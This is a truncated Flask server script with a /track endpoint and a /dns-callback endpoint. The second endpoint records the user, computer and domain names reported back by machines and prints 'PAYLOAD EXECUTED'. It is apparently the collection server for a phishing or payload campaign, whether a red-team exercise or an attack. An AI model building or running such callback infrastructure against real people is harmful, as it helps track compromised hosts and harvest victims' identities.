from flask import Flask, request, jsonify
from datetime import datetime
import json
import os

app = Flask(__name__)

def log_event(event_data):
    print(json.dumps(event_data))
    try:
        with open('events.log', 'a') as f:
            f.write(json.dumps(event_data) + '\n')
    except:
        pass

@app.route('/track', methods=['GET', 'OPTIONS'])
def track():
    if request.method == 'OPTIONS':
        return '', 204
    
    event_data = {
        'event': request.args.get('event', 'unknown'),
        'user_id': request.args.get('id', 'unknown'),
        'timestamp': datetime.now().isoformat(),
        'ip': request.remote_addr,
        'user_agent': request.headers.get('User-Agent', ''),
    }
    
    log_event(event_data)
    print(f"✅ [{event_data['event']}] User: {event_data['user_id']}")
    
    return '', 204

@app.route('/dns-callback', methods=['GET', 'OPTIONS'])
def dns_callback():
    if request.method == 'OPTIONS':
        return '', 204
    
    event_data = {
        'event': 'EXECUTION',
        'user': request.args.get('u', 'unknown'),
        'computer': request.args.get('c', 'unknown'),
        'domain': request.args.get('d', 'unknown'),
        'timestamp': datetime.now().isoformat(),
        'ip': request.remote_addr
    }
    
    log_event(event_data)
    print(f"🚨🚨🚨 PAYLOAD EXECUTED 🚨🚨🚨")
    print(f"User: {event_data['user']} @ {event_data['computer']}")
    
    return '', 204

@app.route('/results', methods=['GET'])
def results():
    try:
        with open
